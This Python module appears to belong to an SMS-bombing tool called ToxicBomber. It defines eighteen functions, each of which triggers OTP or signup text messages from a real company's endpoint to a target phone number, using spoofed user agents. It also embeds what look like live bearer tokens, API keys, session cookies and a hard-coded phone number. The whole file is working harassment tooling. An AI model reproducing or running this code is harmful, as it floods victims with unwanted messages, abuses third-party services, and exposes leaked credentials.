# API Data For ToxicBomber
# A Product Of ToxicNoob

import requests
from requests.structures import CaseInsensitiveDict
import random
import sys

#Random Useragents
useragentList = ["Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G991B/G991BXXU3AUF6) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/363.0.0.30.112;]"]

useragent = random.choice(useragentList)

#Access Checking Function
def check():
    file = open("Tbomb.py", "r").read()
    if not ("Author : ToxicNoob" in file) or not ("GitHub : https://github.com/Toxic-Noob" in file) or not ("ToxicBomber" in file) or not ("https://raw.githubusercontent.com/Toxic-Noob/ToxicBomber/main/more/.version" in file):
        print("\n\033[92m[\033[91m!\033[92m] You Have No Permission To Access This Tool!")
        print("\033[92m[\033[91m!\033[92m] Delete This Tool and git clone Again To Use It!")
        print("\n\033[92m[\033[91m*\033[92m] Tool Link: \033[37mhttps://github.com/Toxic-Noob/ToxicBomber\n")
        sys.exit()

#Check Permission
check()

#1#
def api1(number):
    url = "https://www.bioscopelive.com/en/login/send-otp"
    headers = {"Host" : "www.bioscopelive.com", "upgrade-insecure-requests" : "1", "user-agent" : useragent, "accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-gpc" : "1", "sec-fetch-site" : "none", "sec-fetch-mode" : "navigate", "sec-fetch-dest" : "document", "accept-language" : "en-US,en;q=0.9"}
    params = {"phone" : "880"+number, "operator" : "bd-otp"}
    try:
        response = requests.get(url, params=params, headers=headers).status_code
        return response
    except:
        return "error"


#2#
def api2(number):
    data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
    url = "https://api-v4-2.hungrynaki.com/graphql"
    
    try:
        response = requests.post(url, json=data).status_code
        return response
    except:
        return "error"

#3#
def api3(number): 
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
    data = {"requestType" : "send","phoneNumber" : "+880"+number,"emailConsent" : "true","whatsappConsent" : "true"}
    try:
        response  = requests.post(url, json=data).status_code
        return response
    except:
        return "error"

#4#
def api4(number):
    url = "https://api.redx.com.bd/v1/user/signup"
    data = {"name":number,"phoneNumber":number,"service" : "redx"}
    try:
        response = requests.post(url, json=data).status_code
        return response
    except:
        return "error"

#5#
def api5(number):
    url = "https://api.10minuteschool.com/lms-auth-service/api/v4/auth/userExists"
    data = {"contact" : "+880"+number,"type" : "phone"}
    try:
        response = requests.post(url, json=data).status_code
        return response
    except:
        return "error"

#6#
def api6(number):
    url = "http://lpin.dev.mpower-social.com:6001/usermodule/otp_mobile/?mobile_no=0" + number + "&email=toxicnoob%40gmail.com&verification_type=registration"
    headers = {"content-type" : "application/x-www-form-urlencoded", "accept" : "application/json"}
    try:
        response = requests.get(url, headers=headers).status_code
        return response
    except:
        return "error"

#7#
def api7(number):
    url = "https://students.byjus.com/mobiles/request_otp?mobile=%2B880-"+number
    try:
        response = requests.get(url).status_code
        return response
    except:
        return "error"

#8#
def api8(number):
    url = "https://ss.binge.buzz/otp/send/login"
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    data = "phone="+number
    try:
        response = requests.post(url, headers = headers, data = data).status_code
        return response
    except:
        return "error"

#9#
def api9(number):
    url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
    data = {"msisdn": number}
    response = requests.post(url, json=data)
    if ("otp_sent" in response.text.lower()):
        return 200
    elif ("user_blocked" in response.text.lower()):
        return "error"
    else:
        return 200

#10#
def api10(number):
    url = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"
    data = {"phone":number,"country_code" : "+880","fcm_token" : "null"}
    try:
        response = requests.post(url, headers=headers, json=data).status_code
        return response
    except:
        return "error"

#11#
def api11(number):
    url = "https://api.marketbangla.com/users-1/token/sign-up/"
    data = {"firstName" : "Rahat", "lastName" : "Khan", "phone" : "0"+number}
    try:
        response = requests.post(url, json=data).text
        return response
    except:
        return "error"
    
#12#
def api12(number):
    url = "https://api.arogga.com/v1/auth/sms/send"
    headers = { "Host" : "api.arogga.com", "accept" : "application/json, text/plain, */*", "user-agent" : useragent, "sec-gpc" : "1", "origin" : "https://www.arogga.com", "sec-fetch-site" : "same-site", "sec-fetch-mode" : "cors", "sec-fetch-dest" : "empty", "referer" : "https://www.arogga.com/", "accept-language" : "en-US,en;q=0.9" }
    data = {"mobile" : "+880"+number, "fcmToken" : "", "referral" : ""}
    try:
        response = requests.post(url, headers = headers, data = data).status_code
        return response
    except:
        return "error"

#13#
def api13(number):
    url = "https://prodapi.swap.com.bd/api/v1/send-otp/login?mobile_number=880"+number
    headers = {"x-authorization": "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"}
    data = ""
    try:
        response = requests.post(url, headers = headers, data = data).status_code
        return response
    except:
        return "error"

#14#
#DidNot
def api14(number):
    url = "https://themallbd.com/api/auth/otp_login"
    headers = {"content-type": "application/json"}
    data = {"phone_number" : "+880" + number}
    try:
        response = requests.post(url, headers = headers, data = data).status_code
        return response
    except:
        return "error"


#15#
def api15(number):
    url = "https://m.pizzahutbd.com/customer/sign-in/mobile"
    data = "_token=nu1fmvsEvym9b8h3l7TGH3SSKauUvDbJHyefRuVS&phone_number=01955709505"
    headers = {"Host" : "m.pizzahutbd.com","Connection" : "keep-alive","Content-Length": "72","Upgrade-Insecure-Requests": "1","Origin": "https://m.pizzahutbd.com","Content-Type": "application/x-www-form-urlencoded","Save-Data": "on","User-Agent": useragent,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Referer": "https://m.pizzahutbd.com/customer/login","Accept-Encoding": "gzip, deflate, br","Cookie": "_gcl_au=1.1.1377964494.1627362075; _ga=GA1.2.1350470443.1627362078; _fbp=fb.1.1627362078606.576170593; _gid=GA1.2.868591897.1628186704; _gat_gtag_UA_110954706_5=1; _gat_gtag_UA_150642375_1=1; _gat_UA-150642375-1=1; XSRF-TOKEN=eyJpdiI6IlIrNFQ4czZOa3lHNkNBV3RncHpzTHc9PSIsInZhbHVlIjoiK1ZEZWg4TXhDcWtCdnc4NVRmb2REcENpOXJTTndMcFNoRkJjbDIzVlFZcEZvSkVhVlpXTCtJYzhWcXVaZmxITCIsIm1hYyI6IjMyNmVhNjMwYTFlMWUwM2YzNWJjNDJhYTkzYjA3MTlmOTBiZTkxMTU0MDM1NDRlMWI2NjQwN2IwNzQzMjY5MzAifQ%3D%3D; laravel_session=eyJpdiI6ImVjZGlHdUxSY1drMFVBWnRTR0NhbVE9PSIsInZhbHVlIjoiN3NkOXNlMGQxVGwra2duVUxYTHRydFVDeGRWZ2hXVW1saTlvSmh3U3RVTnZiMzVLc1hNTCtUN2tuK1QxUjBHMCIsIm1hYyI6IjhkNTA4ZDZmNGI5OWEyMzEzMjAxODBiZTkzZDJmZmQ4MDRhMzUyNWNkNjhkMGJhNTAyN2U1ZmE0YWI0YWQyNTUifQ%3D%3D"}
    try:
        response = requests.post(url, headers=headers, data=data).status_code
        return response
    except:
        return "error"


#16#
def api16(number):
    url = "https://api2.bongobd.com/api/login/send-otp"
    headers={"Host": "api2.bongobd.com","Connection": "keep-alive","Content-Length": "43","Origin": "https://bongobd.com","authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJyb2xlcyI6WyJST0xFX1VTRVJfQklPU0NPUEUiLCJST0xFX1VTRVIiLCJST0xFX1VTRVJfQU5PTllNT1VTIl0sInVzZXJuYW1lIjoiYW5vbnltb3VzIiwiY2xpZW50X2xvZ2luX2lkIjo0OTUxOTg3MDA4MiwiY2xpZW50X2lkIjpudWxsLCJwbGF0Zm9ybV9pZCI6ImFiZmVhNDYyLWY2NGQtNDkxZS05Y2Q5LTc1ZWUwMDFmNDViMCIsImJvbmdvX2lkIjoiZDQzMjJkMTUtMmE5YS00ZDI2LWI0YmYtZjQ2NDAzMWQ5MmMxIiwiaWF0IjoxNjI5ODk4Njc4LCJleHAiOjE2MzI0OTA2ODguMH0.CZYJTcvK25cKKaIsfyH1jsdlbsT_6o-KlxyW4GGda92isprdI9KhzG_D-WoJT_-PHU1iTWU2p4O9P9mk9627x7u8pLMKLOPcs0rt4qVUIIu2LbCo27aJcw7zi7Tlp37ZXmMD80st8TVhK4y8nlmdPRkgmBgqnbyimNlLyjMfz9N9IQZ5rM_CngA6yptYDb3WIu-eeLtaYUhGa7PHkiCBTw4SziJDZQz-Wh6axBUuiGq-8izflZOK6OQBZ-bkQZWWjOwhXow0z4XaSHS5u66vglKKpi5HMQEK9HTGnOp7RUtH2bQp58crWTsL0prFpOaeH202hPK3_ssvTA24M9dM_N4N8NdXaEU_zy5bL90KInRaMshd2ejtiisu11DxL6Nqtpv8ZvVqqgBeriMZ4uMtXMsVBNArRJCiXHAMGZg3g5VvzfMTMyw58lUW__3voBJzN8s5MZDs6lR1fzIpuyoKMJW4SAkTSD12oYnNzyDBtL7Ubj9qSfrDKYGbM0tKGMN6xJKwLP9isApEdw72II3v2X-LyWgkANowth8EZo7MU-a09XPMg-Axrjh2zogP37HioYQ3LGFqOuBrvzgTFm8wwrmcCbiyP5bdJMFEq8SyP0Ol_UYjogQ_6pI9NIOHJDMxnqSLFznsy2MWXfaVJ1vJVw6DtmJz2GoYrGgFsx5xxtk","content-type": "application/json","accept": "application/json","platform-id": "abfea462-f64d-491e-9cd9-75ee001f45b0","access-code": "QkQ%3D","User-Agent": useragent,"Save-Data": "on","Referer": "https://bongobd.com/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.9,bn;q=0.8"}
    data = {"operator" : "all","msisdn" : "0"+number}
    try:
        response = requests.post(url, headers=headers, json=data).status_code
        return response
    except:
        return "error"


#17#
def api17(number):
    url = "https://u.icq.net/api/v65/rapi/auth/sendCode"
    headers = {"Host" : "u.icq.net", "Connection" : "keep-alive", "Content-Length" : "143", "Save-Data" : "on", "User-Agent" : useragent, "Content-Type" : "application/json", "Accept" : "*/*", "Origin" : "https://web.icq.com", "Referer" : "https://web.icq.com/", "Accept-Encoding" : "gzip, deflate, br", "Accept-Language" : "en-US,en;q=0.9,bn;q=0.8"}
    data = {"reqId" : "21697-1632387350", "params":{ "phone" : "880"+number, "language" : "en-US", "route" : "sms", "devId" : "ic1rtwz1s1Hj1O0r", "application" : "icq"}}
    try:
        response = requests.post(url, headers=headers, json=data).status_code
        return response
    except:
        return "error"


#18#
def api18(number):
    url = "https://shop.shajgoj.com/wp-admin/admin-ajax.php"
    headers={"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8", "Accept" : "*/*","X-Requested-With" : "XMLHttpRequest"}
    data = "action=xoo_ml_login_with_otp&xoo-ml-phone-login=0" + number + "&xoo-ml-form-token=6967&xoo-ml-form-type=login_user_with_otp&redirect=/my-account/"
    try:
        response = requests.post(url, headers=headers, data=data).status_code
        return response
    except:
        return "error"
